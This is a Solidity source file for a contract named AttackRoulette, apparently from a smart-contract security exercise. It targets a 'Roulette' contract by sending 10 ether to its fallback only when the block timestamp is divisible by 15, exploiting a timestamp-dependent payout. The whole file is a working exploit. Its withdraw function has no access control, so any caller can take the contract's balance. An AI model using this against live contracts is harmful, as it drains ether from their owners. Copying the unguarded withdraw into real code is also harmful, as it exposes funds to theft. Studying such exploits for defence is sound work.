pragma solidity ^0.4.25;

contract AttackRoulette {
    Roulette public target;

    constructor(address _target) public payable {
        require(msg.value >= 10 ether, "Must fund with at least 10 ether");
        target = Roulette(_target);
    }

    // Helper function to fund attack contract if needed
    function fund() public payable {}

    function attack() public {
        require(address(this).balance >= 10 ether, "Insufficient balance to attack");

        // Try to hit the vulnerable condition
        // This will only succeed if timestamp % 15 == 0
        if (now % 15 == 0) {
            // Forward 10 ether to target via fallback
            address(target).call.value(10 ether)();
        }
    }

    // Allow withdrawals by attacker
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}

interface Roulette {
    function () external payable;
}

